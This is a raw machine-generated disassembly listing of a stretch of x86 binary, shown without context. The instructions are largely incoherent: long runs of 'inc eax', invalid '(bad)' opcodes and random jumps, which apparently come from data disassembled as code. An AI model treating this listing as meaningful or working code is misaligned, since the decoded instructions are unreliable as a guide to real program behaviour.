  419c7c:	inc    eax
  419c7d:	inc    eax
  419c7e:	add    dl,ah
  419c80:	call   0x51a165d8
  419c85:	and    eax,0xbcd04af5
  419c8a:	dec    ecx
  419c8b:	lea    ecx,[ebx+0x61]
  419c8e:	inc    eax
  419c8f:	xor    BYTE PTR [edi+0x29],al
  419c92:	dec    ebx
  419c93:	inc    esp
  419c94:	push   ecx
  419c95:	xor    DWORD PTR [edi-0x37bedcb2],edi
  419c9b:	sub    al,0x7b
  419c9d:	inc    eax
  419c9e:	inc    eax
  419c9f:	inc    eax
  419ca0:	inc    eax
  419ca1:	inc    eax
  419ca2:	inc    eax
  419ca3:	and    eax,0xa3404040
  419ca8:	hlt    
  419ca9:	rol    dl,0x54
  419cac:	push   0x40431024
  419cb1:	add    eax,0xc5f911a8
  419cb6:	xchg   edi,eax
  419cb7:	mov    eax,ds:0xcc1187bf
  419cbc:	outs   dx,BYTE PTR ds:[esi]
  419cbd:	inc    eax
  419cbe:	inc    eax
  419cbf:	inc    eax
  419cc0:	inc    eax
  419cc1:	inc    eax
  419cc2:	inc    eax
  419cc3:	inc    eax
  419cc4:	inc    eax
  419cc5:	inc    eax
  419cc6:	inc    eax
  419cc7:	push   ebx
  419cc8:	adc    ecx,DWORD PTR [esi-0xe]
  419ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ccc:	mov    WORD PTR [esi+ecx*1+0x47205dee],es
  419cd3:	inc    edx
  419cd4:	or     eax,0xb04462e4
  419cd9:	pusha  
  419cda:	mov    edi,0x75d8cd72
  419cdf:	sub    al,0x60
  419ce1:	and    dh,ch
  419ce3:	rol    BYTE PTR [eax-0xe],1
  419ce6:	inc    eax
  419ce7:	inc    eax
  419ce8:	inc    eax
  419ce9:	inc    eax
  419cea:	inc    eax
  419ceb:	inc    eax
  419cec:	rol    DWORD PTR [eax+0x40],0x30
  419cf0:	and    bl,BYTE PTR [ebx]
  419cf2:	bound  eax,QWORD PTR [eax-0x5e]
  419cf5:	push   eax
  419cf6:	push   ebp
  419cf7:	bound  ebp,QWORD PTR ds:0x54935b3
  419cfd:	inc    eax
  419cfe:	inc    eax
  419cff:	push   ecx
  419d00:	cdq    
  419d01:	jl     0x419d43
  419d03:	imul   eax,DWORD PTR [ecx+0x41],0x38
  419d07:	mov    ah,0x51
  419d09:	xor    DWORD PTR [eax-0x2ed71dc0],esp
  419d0f:	je     0x419d4d
  419d11:	dec    ebp
  419d12:	mov    ch,0x49
  419d14:	clc    
  419d15:	inc    eax
  419d16:	inc    eax
  419d17:	add    BYTE PTR [eax+0x40],al
  419d1a:	inc    eax
  419d1b:	inc    eax
  419d1c:	inc    eax
  419d1d:	inc    eax
  419d1e:	adc    BYTE PTR [edx-0x22],dl
  419d21:	and    BYTE PTR [eax+0x49a05723],dh
  419d27:	push   ecx
  419d28:	(bad)
  419d2b:	inc    edx
  419d2c:	inc    eax
  419d2d:	adc    eax,0x4ba9e04e
  419d32:	and    BYTE PTR fs:[eax+0x41],cl
  419d36:	les    ebx,FWORD PTR [eax]
  419d38:	mov    eax,0x40404040
  419d3d:	inc    eax
  419d3e:	inc    eax
  419d3f:	inc    eax
  419d40:	inc    eax
  419d41:	inc    eax
  419d42:	inc    eax
  419d43:	repnz adc DWORD PTR [edx],esi
  419d46:	push   esi
  419d47:	ret    
  419d48:	int    0x59
  419d4a:	ja     0x419d99
  419d4c:	sbb    eax,0x126f4055
  419d51:	inc    eax
  419d52:	inc    eax
  419d53:	inc    eax
  419d54:	inc    eax
  419d55:	inc    eax
  419d56:	inc    eax
  419d57:	int3   
  419d58:	jne    0x419d9a
  419d5a:	mov    ebp,0xe3d138ab
  419d5f:	dec    ecx
  419d60:	cli    
  419d61:	inc    ebp
  419d62:	inc    ecx
  419d63:	bound  ebx,QWORD PTR [esi]
  419d65:	push   ecx
  419d66:	rcpps  xmm3,XMMWORD PTR [esi+0x420f6022]
  419d6d:	xchg   ebp,eax
  419d6e:	and    eax,0x63d50d40
  419d73:	cld    
  419d74:	jge    0x419d29
  419d76:	adc    al,0x48
  419d78:	inc    ecx
  419d79:	int    0x3c
  419d7b:	bound  ebp,QWORD PTR [ecx+0x40]
  419d7e:	add    cl,al
  419d80:	inc    eax
  419d81:	inc    eax
  419d82:	inc    eax
  419d83:	inc    eax
  419d84:	add    BYTE PTR [eax+0x32],al
  419d87:	and    dl,BYTE PTR [edx+0x7a]
  419d8a:	inc    eax
  419d8b:	adc    BYTE PTR [esi+0x1c],al
  419d8e:	push   ebp
  419d8f:	xor    DWORD PTR [esi-0x40],ecx
  419d92:	sub    al,BYTE PTR [eax]
  419d94:	pmullw mm2,mm2
  419d97:	push   ebx
  419d98:	mov    edi,0x40404040
  419d9d:	inc    eax
  419d9e:	inc    eax
  419d9f:	inc    eax
  419da0:	inc    eax
  419da1:	inc    DWORD PTR [eax+0x7a]
  419da4:	inc    ecx
  419da5:	inc    esi
  419da6:	std    
  419da7:	dec    edx
  419da8:	repz mov al,0x41
  419dab:	stc    
  419dac:	push   0x2e
  419dae:	arpl   dx,di
  419db0:	inc    ecx
  419db1:	sbb    eax,0x74009cab
  419db6:	dec    esp
  419db7:	cli    
  419db8:	clc    
  419db9:	adc    edi,DWORD PTR [edi+0x5da86205]
  419dbf:	mov    edx,0x40bf4026
  419dc4:	inc    eax
  419dc5:	inc    eax
  419dc6:	inc    eax
  419dc7:	inc    eax
  419dc8:	inc    eax
  419dc9:	inc    eax
  419dca:	inc    eax
  419dcb:	inc    eax
  419dcc:	inc    eax
  419dcd:	inc    ecx
  419dce:	sub    BYTE PTR [ecx-0x23],al
  419dd1:	push   0xe0406172
  419dd6:	inc    ecx
  419dd7:	sub    dh,BYTE PTR [eax-0x26]
  419dda:	ror    BYTE PTR [eax-0x41],cl
  419ddd:	dec    esp
  419dde:	sub    al,BYTE PTR [eax+ebx*8-0x48]
  419de2:	daa    
  419de3:	test   eax,0x40416585
  419de8:	inc    eax
  419de9:	inc    eax
  419dea:	inc    eax
  419deb:	inc    eax
  419dec:	inc    eax
  419ded:	inc    eax
  419dee:	inc    eax
  419def:	add    BYTE PTR [edx+0x43],al
  419df2:	pop    edi
  419df3:	mov    edx,0x2a9a4030
  419df8:	popa   
  419df9:	cld    
  419dfa:	mov    eax,ds:0x15bfeb5b
  419dff:	inc    eax
  419e00:	inc    eax
  419e01:	inc    eax
  419e02:	inc    eax
  419e03:	inc    eax
  419e04:	inc    eax
  419e05:	and    eax,0x40404040
  419e0a:	test   BYTE PTR [edx-0x4a],ch
  419e0d:	shl    DWORD PTR [eax],1
  419e0f:	test   bl,ch
  419e11:	sub    ah,BYTE PTR [ebx-0x50]
  419e14:	push   0x5240ff5e
  419e19:	inc    esp
  419e1a:	outs   dx,BYTE PTR ds:[esi]
  419e1b:	inc    ecx
  419e1c:	mov    ecx,0x65bf30b4
  419e21:	push   eax
  419e22:	test   al,0xad
  419e24:	mov    ah,0x23
  419e26:	dec    ebp
  419e28:	cwde   
  419e29:	inc    eax
  419e2a:	inc    eax
  419e2b:	inc    eax
  419e2c:	inc    eax
  419e2d:	inc    eax
  419e2e:	inc    eax
  419e2f:	inc    eax
  419e30:	inc    eax
  419e31:	inc    eax
  419e32:	inc    eax
  419e33:	and    BYTE PTR [ebx-0x26],dl
  419e36:	push   0x6f403043
  419e3b:	dec    eax
  419e3c:	sub    bl,BYTE PTR [ebp-0x47]
  419e3f:	push   ebx
  419e40:	(bad)  
  419e41:	mov    edi,0x3d4134a5
  419e46:	mov    dl,0x2d
  419e48:	push   ebx
  419e49:	and    dl,BYTE PTR [esi+0x6841098c]
  419e4f:	adc    esp,DWORD PTR [ecx]
  419e51:	jmp    FWORD PTR [ebx+0x5]
  419e54:	cld    
  419e55:	xchg   esp,eax
  419e56:	mov    ecx,0x404040cf
  419e5b:	inc    eax
  419e5c:	inc    eax
  419e5d:	inc    eax
  419e5e:	rol    DWORD PTR [eax+0x40],0x3f
  419e62:	xchg   DWORD PTR [ecx-0x4f199979],edi
  419e68:	pop    ecx
  419e69:	jae    0x419eab
  419e6b:	xchg   esp,eax
  419e6c:	xchg   ecx,eax
  419e6d:	dec    esi
  419e6e:	pop    ebp
  419e6f:	inc    eax
  419e70:	inc    eax
  419e71:	add    BYTE PTR [eax+0x40],al
  419e74:	inc    eax
  419e75:	inc    eax
  419e76:	inc    eax
  419e77:	inc    eax
  419e78:	adc    eax,0xed812242
  419e7d:	mov    edi,0xf54d9dbc
  419e82:	pusha  
  419e83:	inc    eax
  419e84:	adc    eax,0xe250746c
  419e89:	inc    edx
  419e8a:	ja     0x419e0c
  419e8c:	inc    bx
  419e8e:	xchg   ecx,eax
  419e8f:	sar    dl,1
  419e91:	jmp    DWORD PTR [edi]
  419e93:	inc    eax
  419e94:	inc    eax
  419e95:	imul   edi,DWORD PTR [edi-0x16605195],0x40404040
  419e9f:	inc    eax
  419ea0:	inc    eax
  419ea1:	inc    eax
  419ea2:	inc    eax
  419ea3:	inc    eax
  419ea4:	inc    eax
  419ea5:	sti    
  419ea6:	inc    eax
  419ea7:	and    BYTE PTR [eax],ah
  419ea9:	hlt    
  419eaa:	or     eax,0x40b8e1c7
  419eaf:	jb     0x419ef8
  419eb1:	test   al,0x4d
  419eb3:	repz (bad)
  419eb6:	dec    eax
  419eb7:	sti    
  419eb8:	rcl    DWORD PTR [eax],cl
  419eba:	inc    eax
  419ebb:	inc    eax
  419ebc:	inc    eax
  419ebd:	inc    eax
  419ebe:	inc    eax
  419ebf:	inc    eax
  419ec0:	int3   
  419ec1:	jne    0x419f03
  419ec3:	out    dx,eax
  419ec4:	imul   esp,ecx,0x40
  419ec7:	inc    ecx
  419ec8:	test   al,0x28
  419eca:	mov    ah,0xf9
  419ecc:	adc    dh,BYTE PTR [edx]
  419ece:	repz out dx,al
  419ed0:	adc    BYTE PTR [eax+0x3b14ac42],ch
  419ed6:	inc    eax
  419ed7:	call   0x5b8df9b
  419edc:	inc    ebp
  419edd:	xor    dh,cl
  419edf:	arpl   WORD PTR [edi-0x3effbfd6],di
  419ee5:	inc    eax
  419ee6:	inc    eax
  419ee7:	inc    eax
  419ee8:	inc    eax
  419ee9:	add    BYTE PTR [eax-0x74],al
  419eec:	ja     0x419f20
  419eee:	aas    
  419eef:	inc    eax
  419ef0:	imul   edi,DWORD PTR [edi+0x7fe35d41],0x1f
  419ef7:	lock add al,0x54
  419efa:	mov    esp,0xff51f83c
  419eff:	inc    eax
  419f00:	(bad)  
  419f01:	lds    esp,FWORD PTR [eax+edi*4]
  419f04:	stos   BYTE PTR es:[edi],al
  419f05:	xor    edi,edi
  419f07:	jmp    0x419f1e
  419f09:	int    0xbc
  419f0b:	pop    ebp
  419f0c:	pop    eax
  419f0d:	inc    eax
  419f0e:	inc    eax
  419f0f:	inc    eax
  419f10:	inc    eax
  419f11:	inc    eax
  419f12:	inc    eax
  419f13:	inc    eax
  419f14:	inc    eax
  419f15:	inc    DWORD PTR [eax-0x70]
  419f18:	jae    0x419f99
  419f1a:	test   eax,0xaa9d1540
  419f1f:	push   ecx
  419f20:	arpl   WORD PTR [esi-0x5336d558],di
  419f26:	test   al,0x40
  419f28:	push   ds
  419f29:	(bad)
  419f2d:	pop    ebp
  419f2e:	gs xchg ecx,eax
  419f30:	loop   0x419ee8
  419f32:	das    
  419f33:	sub    al,BYTE PTR ds:0x4097edfd
  419f39:	inc    eax
  419f3a:	inc    eax
  419f3b:	inc    eax
  419f3c:	inc    eax
  419f3d:	inc    eax
  419f3e:	inc    eax
  419f3f:	inc    eax
  419f40:	inc    eax
  419f41:	inc    eax
  419f42:	and    DWORD PTR [eax+0x67],eax
  419f45:	dec    ebx
  419f46:	leave  
  419f47:	xor    al,0x27
  419f49:	pop    esp
  419f4a:	sbb    eax,0x9a450dc6
  419f4f:	add    BYTE PTR [ebp+esi*4-0x1f],al
  419f53:	inc    ecx
  419f54:	retf   
  419f55:	in     al,0xb7
  419f57:	cmp    DWORD PTR [ecx],esp
  419f59:	mov    WORD PTR [eax-0x3e],ss
  419f5c:	dec    ecx
  419f5d:	mov    edi,0x33646540
  419f62:	ja     0x419fa5
  419f64:	mov    DWORD PTR [eax-0x6e],0x40404040
  419f6b:	inc    eax
  419f6c:	inc    eax
  419f6d:	inc    eax
  419f6e:	inc    eax
  419f6f:	add    BYTE PTR [ebp-0x3faf36c6],bh
  419f75:	fild   WORD PTR [eax-0x3d]
  419f78:	dec    ebx
  419f79:	xor    DWORD PTR [ebx+0x3e4c407f],edx
  419f7f:	cwde   
  419f80:	push   0x11
  419f82:	enter  0x7050,0x5
  419f86:	addr16 mov bh,0x42
  419f89:	sub    BYTE PTR [edi-0x4334bf81],dl
  419f8f:	mov    ds:0x40f6263,al
  419f94:	push   0x4040c526
  419f99:	inc    eax
  419f9a:	inc    eax
  419f9b:	inc    eax
  419f9c:	inc    eax
  419f9d:	and    eax,0xb7404040
  419fa2:	pop    eax
  419fa3:	aad    0xb4
  419fa5:	loope  0x419fe7
  419fa7:	retf   
  419fa8:	xchg   DWORD PTR [eax+0x30],eax
  419fab:	inc    ecx
  419fac:	test   al,0x9f
  419fae:	pusha  
  419faf:	gs mov edi,0x60ee6340
  419fb5:	dec    eax
  419fb6:	inc    eax
  419fb7:	jbe    0x419f78
  419fb9:	addr16 pusha 
  419fbb:	inc    esp
  419fbc:	pop    ecx
  419fbd:	mov    al,ds:0x40bec458
  419fc2:	inc    eax
  419fc3:	inc    eax
  419fc4:	inc    eax
  419fc5:	inc    eax
  419fc6:	inc    eax
  419fc7:	inc    eax
  419fc8:	inc    eax
  419fc9:	inc    eax
  419fca:	inc    eax
  419fcb:	push   eax
  419fcc:	bound  ebp,QWORD PTR [eax+edi*4]
  419fcf:	cs inc eax
  419fd1:	mov    ecx,0x605dfab4
  419fd6:	pop    edx
  419fd7:	push   esi
  419fd8:	push   eax
  419fd9:	in     al,dx
  419fda:	aad    0x48
  419fdc:	cmp    al,0x4d
  419fde:	repnz popa 
  419fe0:	inc    eax
  419fe1:	gs leave 
  419fe3:	add    eax,0x5d038d5e
  419fe8:	dec    eax
  419fe9:	cli    
  419fea:	inc    esi
  419feb:	retf   
  419fec:	cwde   
  419fed:	inc    esp
  419fee:	mov    esi,0x40404040
  419ff3:	inc    eax
  419ff4:	inc    eax
  419ff5:	rol    DWORD PTR [eax+0x40],0x60
  419ff9:	inc    eax
  419ffa:	add    BYTE PTR [eax+0x57],cl
  419ffd:	push   es
  419ffe:	sub    al,0xbf
  41a000:	pop    ds
  41a001:	inc    eax
  41a002:	bound  esp,QWORD PTR [eax]
  41a004:	stos   DWORD PTR es:[edi],eax
  41a005:	inc    ebx
  41a006:	pop    esi
  41a007:	inc    eax
  41a008:	dec    esi
  41a009:	inc    esi
  41a00a:	rcl    ebp,1
  41a00c:	shl    BYTE PTR [ecx-0x3b],0x40
  41a010:	popa   
  41a011:	inc    ecx
  41a012:	jl     0x419fe1
  41a014:	dec    eax
  41a015:	addr16 pop esp
  41a017:	push   ecx
  41a018:	inc    ecx
  41a019:	inc    esi
  41a01a:	arpl   WORD PTR [eax+0x40],ax
  41a01d:	add    BYTE PTR [eax+0x40],al
  41a020:	inc    eax
  41a021:	inc    eax
  41a022:	inc    eax
  41a023:	inc    eax
  41a024:	inc    eax
  41a025:	inc    eax
  41a026:	mov    gs,esi
  41a028:	cmp    al,0x60
  41a02a:	inc    esi
  41a02b:	push   ebp
  41a02c:	inc    eax
  41a02d:	push   eax
  41a02e:	inc    ebx
  41a02f:	inc    esp
  41a030:	shl    BYTE PTR ds:0x40404046,0x40
  41a037:	inc    eax
  41a038:	inc    eax
  41a039:	inc    eax
  41a03a:	inc    eax
  41a03b:	inc    eax
  41a03c:	inc    eax
  41a03d:	je     0x41a07f
  41a03f:	clc    
  41a040:	cdq    
  41a041:	sub    al,0x71
  41a043:	test   BYTE PTR [ebp+0x54],0x0
  41a047:	or     eax,0x40405c67
  41a04c:	inc    eax
  41a04d:	inc    eax
  41a04e:	inc    eax
  41a04f:	inc    eax
  41a050:	int3   
  41a051:	jne    0x41a093
  41a053:	mov    al,0x3b
  41a055:	dec    esi
  41a056:	mov    esp,0xd5f858bf
  41a05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a05c:	jecxz  0x41a09e
  41a05e:	inc    eax
  41a05f:	mov    edi,0x245c3c65
  41a064:	inc    ecx
  41a065:	inc    eax
  41a066:	rol    DWORD PTR [eax+0x0],1
  41a069:	rol    DWORD PTR [eax+0x40],0x40
  41a06d:	inc    eax
  41a06e:	add    BYTE PTR [eax-0x42],al
  41a071:	push   eax
  41a072:	pop    esi
  41a073:	loop   0x41a0b5
  41a075:	and    BYTE PTR [eax+0x69],al
  41a078:	mov    eax,0x7e443835
  41a07d:	pusha  
  41a07e:	inc    esp
  41a07f:	inc    eax
  41a080:	inc    eax
  41a081:	inc    eax
  41a082:	inc    eax
  41a083:	inc    eax
  41a084:	inc    eax
  41a085:	inc    eax
  41a086:	inc    eax
  41a087:	inc    DWORD PTR [eax+0x4f]
  41a08a:	lds    edi,FWORD PTR [edi+0x4b2a2c69]
  41a090:	inc    esp
  41a091:	test   al,0x87
  41a093:	dec    eax
  41a094:	pushf  
  41a095:	pop    edx
  41a096:	xor    eax,0x491044a0
  41a09b:	cmp    eax,0x6941cd43
  41a0a0:	inc    esp
  41a0a1:	mov    al,ds:0x7afcc34f
  41a0a6:	inc    eax
  41a0a7:	inc    eax
  41a0a8:	inc    eax
  41a0a9:	inc    eax
  41a0aa:	inc    eax
  41a0ab:	inc    eax
  41a0ac:	inc    eax
  41a0ad:	inc    eax
  41a0ae:	inc    eax
  41a0af:	inc    eax
  41a0b0:	pop    eax
  41a0b1:	inc    eax
  41a0b2:	inc    eax
  41a0b3:	inc    ecx
  41a0b4:	xor    al,0x91
  41a0b6:	outs   dx,BYTE PTR ds:[esi]
  41a0b7:	out    dx,al
  41a0b8:	inc    ebx
  41a0b9:	sub    eax,0xbfbf2740
  41a0be:	jne    0x41a104
  41a0c0:	cmp    DWORD PTR [edi+0x42],ebp
  41a0c3:	xor    al,0xbf
  41a0c5:	ins    BYTE PTR es:[edi],dx
  41a0c6:	pushf  
  41a0c7:	sub    al,0x57
  41a0c9:	and    eax,DWORD PTR [edx+0x64]
  41a0cc:	mov    esi,0x31586346
  41a0d1:	xchg   ecx,eax
  41a0d2:	inc    ebp
  41a0d3:	inc    eax
  41a0d4:	inc    eax
  41a0d5:	inc    eax
  41a0d6:	inc    eax
  41a0d7:	inc    eax
  41a0d8:	inc    eax
  41a0d9:	inc    eax
  41a0da:	inc    eax
  41a0db:	add    BYTE PTR [ecx],dl
  41a0dd:	mov    al,0x47
  41a0df:	mov    esp,0x45416ac5
  41a0e4:	push   esp
  41a0e5:	vminps ymm6,ymm5,YMMWORD PTR [esi-0x4d]
  41a0ea:	pusha  
  41a0eb:	inc    edx
  41a0ec:	inc    eax
  41a0ed:	inc    eax
  41a0ee:	inc    eax
  41a0ef:	inc    eax
  41a0f0:	inc    eax
  41a0f1:	inc    eax
  41a0f2:	and    eax,0xd404040
  41a0f7:	xchg   ebp,esp
  41a0f9:	std    
  41a0fa:	test   BYTE PTR [ecx+0x33],0x46
  41a0fe:	retf   
  41a0ff:	inc    ebx
  41a100:	test   al,0x4d
  41a102:	inc    esp
  41a103:	shl    DWORD PTR [edx+0x47],cl
  41a106:	push   edi
  41a107:	sbb    dl,BYTE PTR [eax]
  41a109:	enter  0x4f2c,0xa7
  41a10d:	inc    eax
  41a10e:	inc    eax
  41a10f:	inc    eax
  41a110:	inc    eax
  41a111:	inc    eax
  41a112:	inc    eax
  41a113:	inc    eax
  41a114:	inc    eax
  41a115:	inc    eax
  41a116:	inc    eax
  41a117:	inc    edi
  41a118:	stos   DWORD PTR es:[edi],eax
  41a119:	cmp    al,0xb8
  41a11b:	xor    dl,BYTE PTR [esi+0x75]
  41a11e:	push   eax
  41a11f:	dec    edx
  41a120:	inc    ebx
  41a121:	mov    edi,0x55d51941
  41a126:	pusha  
  41a127:	dec    edx
  41a128:	or     al,0xbf
  41a12a:	mov    dh,0x43
  41a12c:	shr    DWORD PTR fs:[eax+0x40],1
  41a130:	cld    
  41a131:	mov    esi,0x41f6fe18
  41a136:	inc    eax
  41a137:	inc    esi
  41a138:	in     eax,0xac
  41a13a:	arpl   WORD PTR [ebx+0x40],si
  41a13d:	inc    eax
  41a13e:	inc    eax
  41a13f:	inc    eax
  41a140:	inc    eax
  41a141:	inc    eax
  41a142:	rol    DWORD PTR [eax+0x40],0x66
  41a146:	jbe    0x41a167
  41a148:	inc    edx
  41a149:	dec    edx
  41a14a:	lds    ebp,FWORD PTR [edx]
  41a14c:	mov    al,0x24
  41a14e:	inc    ecx
  41a14f:	dec    ebp
  41a150:	inc    esi
  41a151:	int    0x42
  41a153:	cmovae edx,DWORD PTR [edi+edi*2+0x64]
  41a158:	inc    esi
  41a159:	inc    eax
  41a15a:	jg     0x41a107
  41a15c:	std    
  41a15d:	int    0x40
  41a15f:	inc    eax
  41a160:	add    BYTE PTR [eax+0x40],al
  41a163:	inc    eax
  41a164:	inc    eax
  41a165:	inc    eax
  41a166:	inc    eax
  41a167:	aas    
  41a168:	icebp  
  41a169:	inc    eax
  41a16a:	xor    BYTE PTR [edx+eax*2],dh
  41a16d:	jle    0x41a1cb
  41a16f:	push   es
  41a170:	outs   dx,DWORD PTR ds:[esi]
  41a171:	inc    esi
  41a172:	addr16 xor al,0x41
  41a175:	dec    ebp
  41a176:	cli    
  41a177:	lahf   
  41a178:	inc    eax
  41a179:	inc    eax
  41a17a:	inc    eax
  41a17b:	inc    eax
  41a17c:	inc    eax
  41a17d:	inc    eax
  41a17e:	inc    eax
  41a17f:	inc    eax
  41a180:	inc    eax
  41a181:	inc    eax
  41a182:	inc    ebx
  41a183:	inc    esi
  41a184:	je     0x41a14a
  41a186:	outs   dx,DWORD PTR ds:[esi]
  41a187:	rol    BYTE PTR [esp+edx*2+0x25],1
  41a18b:	inc    esi
  41a18c:	test   al,0x4f
  41a18e:	cmp    al,0x5d
  41a190:	sub    al,0x9f
  41a192:	inc    esp
  41a193:	inc    eax
  41a194:	adc    cl,BYTE PTR [ecx+0x5452bc64]
  41a19a:	inc    eax
  41a19b:	inc    eax
  41a19c:	inc    eax
  41a19d:	inc    eax
  41a19e:	inc    eax
  41a19f:	inc    eax
  41a1a0:	int3   
  41a1a1:	jne    0x41a1e3
  41a1a3:	pusha  
  41a1a4:	inc    eax
  41a1a5:	mov    al,0xc5
  41a1a7:	jge    0x41a21d
  41a1a9:	lds    ebx,FWORD PTR [edi-0x77bebfd9]
  41a1af:	cmp    al,0x74
  41a1b1:	adc    eax,0x40401805
  41a1b6:	mul    BYTE PTR [edx+eiz*2+0x40]
  41a1ba:	add    cl,al
  41a1bc:	inc    eax
  41a1bd:	inc    eax
  41a1be:	inc    eax
  41a1bf:	inc    eax
  41a1c0:	add    BYTE PTR [eax-0x6],al
  41a1c3:	pop    ds
  41a1c4:	and    DWORD PTR [esi+0x30],ecx
  41a1c7:	dec    edi
  41a1c8:	sub    DWORD PTR [ecx+eiz*2+0x684642d0],esi
  41a1cf:	nop
  41a1d0:	cmp    BYTE PTR [eax+0x40],al
  41a1d3:	inc    eax
  41a1d4:	inc    eax
  41a1d5:	inc    eax
  41a1d6:	inc    eax
  41a1d7:	inc    eax
  41a1d8:	inc    eax
  41a1d9:	inc    DWORD PTR [eax+0x41]
  41a1dc:	xor    al,0xf
  41a1de:	and    BYTE PTR [esi+0x57],al
  41a1e1:	inc    esi
  41a1e2:	jb     0x41a191
  41a1e4:	push   eax
  41a1e5:	push   ebp
  41a1e6:	and    DWORD PTR [esi+0x35],eax
  41a1e9:	and    BYTE PTR [ecx-0x36],ch
  41a1ec:	sub    BYTE PTR [eax+0x50],dl
  41a1ef:	inc    esi
  41a1f0:	sub    al,0x34
  41a1f2:	mov    esp,0x2165bdc5
  41a1f7:	dec    ebp
  41a1f8:	mov    dh,0x20
  41a1fa:	bound  ebp,QWORD PTR ds:0x422daac0
  41a200:	popa   
  41a201:	or     al,BYTE PTR [eax+0x40]
  41a204:	inc    eax
  41a205:	inc    eax
  41a206:	inc    eax
  41a207:	inc    eax
  41a208:	inc    eax
  41a209:	inc    eax
  41a20a:	inc    eax
  41a20b:	inc    eax
  41a20c:	retf   
  41a20d:	inc    ecx
  41a20e:	cmp    al,0x6f
  41a210:	imul   eax,DWORD PTR [eax+0x60],0xcd94468d
  41a217:	cmp    cl,ah
  41a219:	inc    eax
  41a21a:	arpl   WORD PTR [edx+0x7d],sp
  41a21d:	(bad)  
  41a21e:	push   0x6f
  41a220:	inc    eax
  41a221:	inc    eax
  41a222:	adc    DWORD PTR [ebx-0x26],esi
  41a225:	test   al,0xf5
  41a227:	inc    eax
  41a228:	inc    eax
  41a229:	inc    eax
  41a22a:	inc    eax
  41a22b:	inc    eax
  41a22c:	inc    eax
  41a22d:	inc    eax
  41a22e:	inc    eax
  41a22f:	add    BYTE PTR [edi],bh
  41a231:	and    BYTE PTR [edx],cl
  41a233:	je     0x41a291
  41a235:	sbb    al,0x12
  41a237:	popa   
  41a238:	push   ebp
  41a239:	sub    ecx,DWORD PTR [edx]
  41a23b:	sub    eax,0x345142a8
  41a240:	call   FWORD PTR [ebx]
  41a242:	add    eax,0x41dd1263
  41a247:	inc    eax
  41a248:	inc    eax
  41a249:	inc    eax
  41a24a:	inc    eax
  41a24b:	inc    eax
  41a24c:	inc    eax
  41a24d:	and    eax,0x4c404040
  41a252:	push   ebp
  41a253:	bound  eax,QWORD PTR [edx+esi*1]
  41a256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a257:	mov    ds:0x6effc564,eax
  41a25c:	or     ch,BYTE PTR [ebp+edx*1+0x554a3831]
  41a263:	data16 or al,BYTE PTR [eax+0x40]
  41a267:	inc    eax
  41a268:	inc    eax
  41a269:	inc    eax
  41a26a:	inc    eax
  41a26b:	inc    eax
  41a26c:	inc    eax
  41a26d:	inc    eax
  41a26e:	inc    eax
  41a26f:	push   esi
  41a270:	retf   
  41a271:	aad    0x52
  41a273:	cli    
  41a274:	jmp    DWORD PTR [ecx+0x2d]
  41a277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a278:	adc    DWORD PTR [ebx+0x4055f850],edi
  41a27e:	add    eax,0xd010bf04
  41a283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a284:	jmp    DWORD PTR [eax+0x40]
  41a287:	inc    eax
  41a288:	inc    eax
  41a289:	inc    eax
  41a28a:	inc    eax
  41a28b:	inc    eax
  41a28c:	rol    DWORD PTR [eax+0x40],0xa
  41a290:	xchg   ecx,eax
  41a291:	mov    edi,0x25566c62
  41a296:	outs   dx,DWORD PTR ds:[esi]
  41a297:	or     al,BYTE PTR [eax]
  41a299:	mov    edi,0x33dae447
  41a29e:	xchg   esi,eax
  41a29f:	sub    eax,0xbff044f8
  41a2a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2a5:	xor    al,0x2d
  41a2a7:	sub    ebp,DWORD PTR [ecx*8+0x404052]
  41a2ae:	inc    eax
  41a2af:	inc    eax
  41a2b0:	inc    eax
  41a2b1:	inc    eax
  41a2b2:	inc    eax
  41a2b3:	inc    eax
  41a2b4:	into   
  41a2b5:	push   esi
  41a2b6:	mov    ebp,0xcd160aa2
  41a2bb:	mov    ch,0x22
  41a2bd:	mov    ecx,0x400a342d
  41a2c2:	inc    eax
  41a2c3:	inc    eax
  41a2c4:	inc    eax
  41a2c5:	inc    eax
  41a2c6:	inc    eax
  41a2c7:	inc    eax
  41a2c8:	inc    eax
  41a2c9:	inc    eax
  41a2ca:	inc    eax
  41a2cb:	fs inc eax
  41a2cd:	inc    eax
  41a2ce:	lock mov ds:0x8a0e3116,al
  41a2d4:	sub    ah,BYTE PTR [ebx+0x63]
  41a2d7:	inc    esi
  41a2d8:	pop    ss
  41a2d9:	loope  0x41a302
  41a2db:	push   0xb5c21f40
  41a2e0:	stc    
  41a2e1:	js     0x41a306
  41a2e3:	arpl   WORD PTR [edx],bp
  41a2e5:	sub    BYTE PTR [eax+eiz*4],ah
  41a2e8:	xor    esp,edx
  41a2ea:	inc    eax
  41a2eb:	inc    eax
  41a2ec:	inc    eax
  41a2ed:	inc    eax
  41a2ee:	inc    eax
  41a2ef:	inc    eax
  41a2f0:	int3   
  41a2f1:	jne    0x41a333
  41a2f3:	and    DWORD PTR [edx+0x40],eax
  41a2f6:	bound  ebp,QWORD PTR [esi+edx*2-0x2ff5d9ad]
  41a2fd:	inc    eax
  41a2fe:	cmp    edx,DWORD PTR ds:0xa4db5b9
  41a304:	inc    eax
  41a305:	add    cl,al
  41a307:	inc    eax
  41a308:	inc    eax
  41a309:	inc    eax
  41a30a:	inc    eax
  41a30b:	add    BYTE PTR [eax+0x59],al
  41a30e:	inc    ecx
  41a30f:	mov    ebx,0x62429ecb
  41a314:	or     al,BYTE PTR [edx-0x25]
  41a317:	test   al,0x58
  41a319:	push   esi
  41a31a:	cmp    ebp,DWORD PTR [eax]
  41a31c:	or     dl,cl
  41a31e:	les    edx,FWORD PTR [eax]
  41a320:	or     eax,0xa5642b9
  41a325:	fimul  DWORD PTR [edi-0x5c]
  41a328:	retf   
  41a329:	pushf  
  41a32a:	aas    
  41a32b:	or     DWORD PTR [edx],0x40404028
  41a331:	inc    eax
  41a332:	inc    eax
  41a333:	inc    eax
  41a334:	inc    eax
  41a335:	inc    eax
  41a336:	inc    DWORD PTR [eax+0x40]
  41a339:	inc    edx
  41a33a:	inc    edx
  41a33b:	inc    cx
  41a33d:	cmc    
  41a33e:	or     dl,BYTE PTR [ecx-0x5a36b87c]
